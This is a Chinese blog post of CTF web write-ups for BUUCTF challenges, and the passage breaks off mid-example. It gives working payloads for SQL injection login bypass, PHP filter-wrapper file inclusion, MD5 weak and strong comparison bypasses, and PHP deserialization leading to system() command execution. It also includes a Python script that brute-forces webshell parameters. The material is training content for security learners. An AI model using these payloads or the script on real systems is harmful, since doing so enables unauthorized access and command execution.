
--- 
title:  CTFWeb-BUUCTF竞赛真题WriteUp(1）_ctf no0b 
tags: []
categories: [] 

---
### 前言

BUUCTF （北京联合大学CTF）平台拥有大量免费的 CTF 比赛真题环境：

<img src="https://img-blog.csdnimg.cn/20200818172059864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 此处记录下部分 Web 题目练习过程。

### No.1 极客挑战-Sql注入万能密码

1、先看看题目连接： <img src="https://img-blog.csdnimg.cn/20210428232642204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 2、访问题目地址是个高大上的登录页面： <img src="https://img-blog.csdnimg.cn/20210428232713608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">3、输入账号密码 `admin/123456` 提示账号密码错误： <img src="https://img-blog.csdnimg.cn/20210428232809724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4、输入账号密码 `admin'/123456` 报错，判断存在SQL注入： <img src="https://img-blog.csdnimg.cn/20210428232910659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 5、尝试使用万能密码 `admin' or 1=1#`（用户名）+ 任意密码，成功拿到 flag： <img src="https://img-blog.csdnimg.cn/20210428233027759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

>  
 【注意】此处在用户名处尝试使用万能密码时，仅有上述`admin' or 1=1#`格式有效，对于`admin';--+`、`admin' or 1=1--+`等格式均不好使，测试过程中应多尝试！ 


### No.2 极客挑战-PHP伪协议利用

前面在 Bugku 也做了类似题目： 第16 题，回顾下核心知识点 ： <img src="https://img-blog.csdnimg.cn/20210428235541893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 1、来看看题目： <img src="https://img-blog.csdnimg.cn/20210428235944297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">2、访问题目地址： <img src="https://img-blog.csdnimg.cn/2021042900002179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">3、查看网页源码，获得提示路径 `./Archive_room.php`： <img src="https://img-blog.csdnimg.cn/2021042900050178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 4、访问上述路径，新的页面有，个`SELECT` 按钮，可触发`./action.php`： <img src="https://img-blog.csdnimg.cn/20210429000708878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">5、点击`SELECT` 按钮，啥也没，但发现 URL 是 `end.php` 而非预期的`action.php` ： <img src="https://img-blog.csdnimg.cn/20210429001040714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">6、结合网页提示，返回上一页面，重新点击 `SELECT` 按钮并抓包观察，发现惊喜： <img src="https://img-blog.csdnimg.cn/20210429001343210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">7、访问`secr3t.php` 获得 PHP 审计源码： <img src="https://img-blog.csdnimg.cn/20210429001736389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">源码如下：

```
&lt;html&gt;
    &lt;title&gt;secret&lt;/title&gt;
    &lt;meta charset="UTF-8"&gt;
&lt;?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?&gt;
&lt;/html&gt;


```

8、看到 `include` 函数便可到文件包含漏洞了，过滤了`../`可排除目录穿越： <img src="https://img-blog.csdnimg.cn/20210429002030857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">9、过滤的关键词没有过滤`file`伪协议，可利用文件包含漏洞（PHP 伪协议）构造 payload：`?file=php://filter/convert.base64-encode/resource=flag.php`， <img src="https://img-blog.csdnimg.cn/20210429002214150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">10、解密上面获得的 base64 编码字符串，获得 flag： <img src="https://img-blog.csdnimg.cn/20210429002443742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

### No.3 ACTF- PHP的弱比较类型

1、看看题目链接： <img src="https://img-blog.csdnimg.cn/2021042923570583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">2、访问题目地址： <img src="https://img-blog.csdnimg.cn/20210429235742508.png" alt="在这里插入图片描述">3、根据题目的提示，猜测是备份文件的泄露，dirsearch 扫下目录发现惊喜： <img src="https://img-blog.csdnimg.cn/20210430000846296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 4、访问 `index.php.bak`： <img src="https://img-blog.csdnimg.cn/20210430000953200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">文件源码如下：

```
&lt;?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}


```

看重点， `==` PHP 弱类型比较，int 和 string 无法直接比较，php 会将 string 转换成 int，然后再进行比较，转换成 int 比较时只保留数字，第一个字符串之后的所有内容会被截掉，str 隐性的转换成整型 123。

5、综上，构造 Payload：

```
?key=123


```

访问获得 Flag： <img src="https://img-blog.csdnimg.cn/2021043000150596.png" alt="在这里插入图片描述">

### No.4 BJDCTF-MD5的弱/强碰撞

1、看看题目链接：

<img src="https://img-blog.csdnimg.cn/20200821185347376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20200821185359745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 2、感觉是sql注入，但是注不出来，试着抓包发现提示 hint：

<img src="https://img-blog.csdnimg.cn/20200821185516524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 好了，sql注入石锤，还找到了 Hint:

```
 select * from 'admin' where password=md5($pass,true)


```

重点看下 `md5($pass,true)` 这个函数： <img src="https://img-blog.csdnimg.cn/20200821190812761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">

就是说我们输入$pass时，首先会被md5加密，然后会被转换成16字符的二进制格式。百度后发现这个可以用`ffifdyop`绕过，绕过原理是：ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，而 Mysql 刚好又会把 hex 转成 ASCII 解释，这个字符串前几位刚好是`' or '6`，因此拼接之后的形式是`select * from 'admin' where password='' or '6xxxxx'`，等价于 or 一个永真式，因此相当于万能密码，可以绕过 md5() 函数。

3、提交 ffifdyop 进行查询，跳转下一页面：

<img src="https://img-blog.csdnimg.cn/202008211910392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 查看源码：

<img src="https://img-blog.csdnimg.cn/2020082119113484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">

典型的 md5 碰撞嘛，这个是弱比较，所以可以用md5值为0e开头的来撞。

>  
 【MD5弱碰撞】 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，**它把每一个以”0E”开头的哈希值都解释为0**，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。 


这里提供一些 md5 以后是 0e 开头的值：

```
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s214587387a
0e848240448830537924465865611904

s878926199a
0e545993274517709034328855841020

s1091221200a
0e940624217856561557816327384675


```

4、于是构造`http://37d8016d-643c-4764-8e62-c8a24e224a75.node3.buuoj.cn/levels91.php?a=QNKCDZO&amp;b=s878926199a`即可绕过并跳转到新的页面：

<img src="https://img-blog.csdnimg.cn/20200821191422279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 这里可以用两个方法解决：

**（1）可以利用数组**：md5强比较，此时如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到===强比较的值相等。故构造：`param1[]=111&amp;param2[]=222`即可。

>  
 【解析】md5() 或者 sha1() 之类的哈希函数计算的是一个字符串的哈希值，对于数组则返回 false，如果`$param1`和`$param2`都是数组则双双返回 FALSE, 两个 FALSE 相等故得以绕过。 


**（2）利用 md5 值的强碰撞**：找到两个md5值相同的字符串即可。

```
d131dd02c5e6eec4693d9a0698aff95c
2fcab58712467eab4004583eb8fb7f89
55ad340609f4b30283e488832571415a
085125e8f7cdc99fd91dbdf280373c5b
d8823e3156348f5bae6dacd436c919c6
dd53e2b487da03fd02396306d248cda0
e99f33420f577ee8ce54b67080a80d1e
c69821bcb6a8839396f9652b6ff72a70

d131dd02c5e6eec4693d9a0698aff95c
2fcab50712467eab4004583eb8fb7f89
55ad340609f4b30283e4888325f1415a
085125e8f7cdc99fd91dbd7280373c5b
d8823e3156348f5bae6dacd436c919c6
dd53e23487da03fd02396306d248cda0
e99f33420f577ee8ce54b67080280d1e
c69821bcb6a8839396f965ab6ff72a70

两段数据的MD5均为：
79054025255fb1a26e4bc422aef54eb4


```

这里采用第一个方法获得Flag：

<img src="https://img-blog.csdnimg.cn/20200821191645631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 【补充】如果说后台的判断语句如下，则只能用第二种方法进行绕过：

<img src="https://img-blog.csdnimg.cn/20200821192551303.png#pic_center" alt="在这里插入图片描述">

### No.5 强网杯-Py脚本找Webshell

1、创建并访问靶机：

<img src="https://img-blog.csdnimg.cn/202008181723476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20200818172407827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">

2、根据题目提示，访问并下载 www.tar.gz：

<img src="https://img-blog.csdnimg.cn/20200818172513555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20200818172611452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 打开压缩包，发现有3000多个php文件，尝试搜索flag文件，未果。于是打开php文件进行代码审计，发现代码中存在大量使用 `system()/eval()/assert()` 等函数执行 get 或 post 传递的参数，这意味我们也许可以通过传递参数的方式来执行任意命令。

<img src="https://img-blog.csdnimg.cn/20200818174753446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">

尝试直接在URL构造语句尝试传递参数，页面无法返回正确的输出结果。由于php文件过多和每个文件的参数过多，因此需要编写一个脚本来进行爆破，找出行之有效的参数。

3、此处附上大佬的 Python 自动化脚本：

```
# -*- coding: utf8 -*-
import os
import requests
import re
import time
import io
 
def read_file(path, command):  #遍历文件找出所有可用的参数
    with io.open(path,encoding="utf-8") as file:
        f = file.read()
    params = {}
    pattern = re.compile("(?&lt;=\$_GET\[').*?(?='\])")  #match get
    for name in pattern.findall( f ):
        params[name] = command
 
    data = {}
    pattern = re.compile("(?&lt;=\$_POST\[').*?(?='\])")  #match get
    for name in pattern.findall( f ):
        data[name] = command
    return params, data
 
def url_explosion(url, path, command):   #确定有效的php文件
    params, data = read_file(path,command)
    try:
        r = requests.session().post(url, data = data, params = params)
        if r.text.find("haha") != -1 :
            print(url,"\n")
            find_params(url, params, data)         
 
    except:
        print(url,"异常")
   
def find_params(url, params, data):   #确定最终的有效参数
    try:
        for pa in params.keys():
            temp = {pa:params[pa]}
            r = requests.session().post(url, params = temp)
            if r.text.find("haha") != -1 :
                print(pa)
                os.system("pause")
                
    except:
        print("error!\n")
    try:
        for da in data.items():
            temp = {da:data[da]}
            r = requests.session().post(url, data = temp)
            if r.text.find("haha") != -1 :
                print(da) 
                os.system("pause")
    except:
        print("error!\n")
 
 
rootdir = "C:\Users\True\Downloads\www\src"  #php文件存放地址
list = os.listdir(rootdir)
for i in range(0, len(list)):
    path = os.path.join(rootdir ,list[i])
    name = list[i].split('-2')[0]   #获取文件名
    url = "http://d0c4841b-992a-4800-8e44-2527f2e8a966.node3.buuoj.cn/" + name
    url_explosion(url,path,"echo haha")  


```

单线程的脚本，跑完大概花了10分钟……

<img src="https://img-blog.csdnimg.cn/20200818175716859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 4、尝试进行利用，成功获得Flag：

<img src="https://img-blog.csdnimg.cn/20200818175857200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">

### No.6 网鼎杯-PHP反序列化利用

1、创建并访问靶机：

<img src="https://img-blog.csdnimg.cn/20200820152108125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">

<img src="https://img-blog.csdnimg.cn/20200820150528664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 2、页面不断地刷新，也没看到什么有用的提示和信息，抓包看一下：

<img src="https://img-blog.csdnimg.cn/20200820152911570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 3、上面POST请求中，date 是php中一个获取时间的函数，而后面的p参数用于获取当地的时间。利用 func 和 p 的传参，可以执行我们想要的函数。于是试一下`eval / assert /system`，结果发现被禁了(提示为Hacker)：

<img src="https://img-blog.csdnimg.cn/20200820160404193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 4、换个思路，使用以下函数查看 index.php 源码：

```
func=file_get_contents&amp;p=index.php    
func=highlight_file&amp;p=index.php


```

这两个函数没有被禁，我们都可以得到源码:

<img src="https://img-blog.csdnimg.cn/20200820161521998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 完整代码如下：

```
&lt;?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval",
    "proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array",
    "call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function",
    "filter_var", "filter_var_array", "uasort", "uksort","array_reduce","array_walk", "array_walk_recursive","pcntl_exec",
    "fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this-&gt;func != "") {
                echo gettime($this-&gt;func, $this-&gt;p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
?&gt;


```

可以看到，基本上可以得到webshell的危险函数全被禁止了。

5、仔细阅读源码发现一个类 Test，里面有一个析构函数，可以执行我们想要的函数，依然是传参函数名+参数。并且没有过滤 func，**联想到反序列化后会执行析构函数，那么我们可以构造一个序列化的字符串，传入我们想要执行的危险函数**。于是构造payload：

```
func=unserialize&amp;p=O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}


```

其EXP如下：

```
&lt;?php
 class Test {
        var $p = "ls /";
        var $func = "system";
}
$a = new Test();
echo serialize($a);
//unserialize
?&gt;


```

执行结果如下图所示：

<img src="https://img-blog.csdnimg.cn/20200820165834759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">

6、使用命令`find / -name flag*`查找flag的位置：

<img src="https://img-blog.csdnimg.cn/20200820170308986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 7、执行命令`cat /tmp/flagoefiu4r93`读取flag：

<img src="https://img-blog.csdnimg.cn/20200820170427221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">

### No.7 安洵杯-PHP反序列化溢出

1、创建并访问靶机：

<img src="https://img-blog.csdnimg.cn/20200821104635799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20200821104644826.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20200821104703862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 2、完整的源码如下：

```
 &lt;?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
} 


```

3、分析以上代码，提示参数 f=phpinfo 时会发现一些东西，于是我们让 f=phpinfo ，发现在 php.ini 里藏了一个文件 d0g3_f1ag.php：

<img src="https://img-blog.csdnimg.cn/20200821105118786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 接访问 d0g3_f1ag.php 发现没有任何内容:

<img src="https://img-blog.csdnimg.cn/20200821105228982.png#pic_center" alt="在这里插入图片描述">

看样子我们要放办法去读取里面的内容，直至于怎么去读取呢，我们需要进一步分析。代码最后一行有一个`file_get_contents`是能够读取文件的函数，但读取是有前提的：
- $function我们可以通过 $f 直接赋值，没什么问题；- 解题目标就是要让`base64_decode($userinfo[‘img’])=d0g3_f1ag.php`；- 那么就要让`$userinfo[‘img’]=ZDBnM19mMWFnLnBocA==`；- 而`$userinfo`又是通过`$serialize_info`反序列化来的，`$serialize_info`又是通过 $session 序列化之后再过滤得来的。- $session里面的 img 参数如果直接指定的话会被sha1哈希，到时候就不能被 base64 解密了。
如果我们没有传入img_path，那么后台将默认赋值为 guest_img.png 的base64编码。这样看来这个`$userinfo['img']`并不是我们可控的，此时需要把注意力转移到另外一个函数 serialize 上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，就是数组里提到的`'php','flag','php5','php4','fl1g'`都会被空格替代，而这层过滤函数会干扰序列化后的数据。

**4、先来了解下 **php反序列化字符逃逸****

在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，例如：

```
&lt;?php
  $str='a:2:{i:0;s:8:"Hed9eh0g";i:1;s:5:"aaaaa";}';
  var_dump(unserialize($str));
?&gt;


```

输出结果：

```
array(2) { 
    [0]=&gt; string(8) "Hed9eh0g" 
    [1]=&gt; string(5) "aaaaa" 
}


```

一般我们会认为，只要增加或去除str的任何一个字符都会导致反序列化的失败。 但是事实并非如此，如果我们在str结尾的花括号后再增加一些字符呢？例如：

<img src="https://img-blog.csdnimg.cn/20200821111843190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 仍然可以输出上面的结果，这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符(第二个例子里的abc)都会被忽略，不影响反序列化的正常进行。

5、接下来看看下面的例子：

```
&lt;?php
  $_SESSION["user"]='flagflagflagflagflagflag';
  $_SESSION["function"]='a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}';
  $_SESSION["img"]='L2QwZzNfZmxsbGxsbGFn';
  echo serialize($_SESSION);
?&gt;


```

结果为：

```
a:3:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}


```

假设后台存在一个过滤机制，会将含flag字符替换为空，那么以上序列化字符串过滤结果为：

```
a:3:{s:4:"user";s:24:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}


```

将这串字符串进行序列化会得到什么？

这个时候关注第二个s所对应的数字，本来由于有6个flag字符所以为24，现在这6个flag都被过滤了，那么它将会尝试向后读取24个字符看看是否满足序列化的规则，也即读取`;s:8:"function";s:59:"a`,读取这24个字符后以`”;`结尾，恰好满足规则，而后第三个s向后读取img的20个字符，第四个、第五个s向后读取均满足规则，所以序列化结果为：

```
array(3) { 
  ["user"]=&gt; string(24) "";s:8:"function";s:59:"a" 
